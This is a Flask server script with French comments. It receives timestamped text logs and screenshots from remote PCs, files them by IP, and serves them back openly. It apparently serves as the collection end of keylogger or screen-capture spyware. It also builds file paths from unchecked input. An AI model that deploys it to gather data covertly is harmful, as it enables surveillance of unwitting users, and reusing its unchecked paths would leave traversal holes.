from flask import Flask, request, jsonify, send_file
import os
import json

app = Flask(__name__)

# Dossier principal pour stocker les logs et images
BASE_DIR = "logs_data"
if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)

def get_client_ip():
    """Récupère l'adresse IP du client."""
    return request.remote_addr

def get_ip_dir(ip):
    """Retourne le chemin du dossier pour une IP spécifique."""
    return os.path.join(BASE_DIR, ip)

def save_log(ip, timestamp, text, filename=None):
    """Sauvegarde le log texte dans un fichier JSON sous l'IP du client."""
    ip_dir = get_ip_dir(ip)
    text_file = os.path.join(ip_dir, "logs.json")

    # Charger les logs existants
    if os.path.exists(text_file):
        with open(text_file, "r") as f:
            logs = json.load(f)
    else:
        logs = []

    logs.append({"timestamp": timestamp, "text": text, "screenshot": filename})

    # Sauvegarde des logs
    with open(text_file, "w") as f:
        json.dump(logs, f, indent=4)

@app.route("/upload", methods=["POST"], strict_slashes=False)
def upload_log():
    """Reçoit les logs et les captures d'écran en les rangeant par IP."""
    timestamp = request.form.get("timestamp")
    text = request.form.get("text")
    screenshot = request.files.get("screenshot")
    
    if not timestamp or not text:
        return jsonify({"error": "Invalid data"}), 400

    ip = get_client_ip()
    ip_dir = get_ip_dir(ip)

    # Création des dossiers pour cette IP
    os.makedirs(os.path.join(ip_dir, "screenshots"), exist_ok=True)

    filename = None
    if screenshot:
        filename = f"screenshots/{timestamp.replace(':', '_')}.png"
        screenshot.save(os.path.join(ip_dir, filename))

    # Sauvegarder le log
    save_log(ip, timestamp, text, filename)

    return jsonify({"status": "success"}), 200

@app.route("/logs", methods=["GET"])
def get_logs():
    """Retourne tous les logs, classés par IP."""
    data = {}
    for ip in os.listdir(BASE_DIR):
        logs_file = os.path.join(BASE_DIR, ip, "logs.json")
        if os.path.exists(logs_file):
            with open(logs_file, "r") as f:
                data[ip] = json.load(f)
    return jsonify(data)

@app.route("/logs/<ip>", methods=["GET"])
def get_logs_by_ip(ip):
    """Retourne les logs d'une IP spécifique."""
    logs_file = os.path.join(BASE_DIR, ip, "logs.json")
    if os.path.exists(logs_file):
        with open(logs_file, "r") as f:
            return jsonify(json.load(f))
    return jsonify({"error": "No logs found for this IP"}), 404

@app.route("/image/<ip>/<filename>", methods=["GET"])
def get_image(ip, filename):
    """Retourne une capture d'écran spécifique pour une IP donnée."""
    img_path = os.path.join(BASE_DIR, ip, "screenshots", filename)
    if os.path.exists(img_path):
        return send_file(img_path, mimetype="image/png")
    return jsonify({"error": "Image not found"}), 404

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)  # Accessible depuis un autre PC
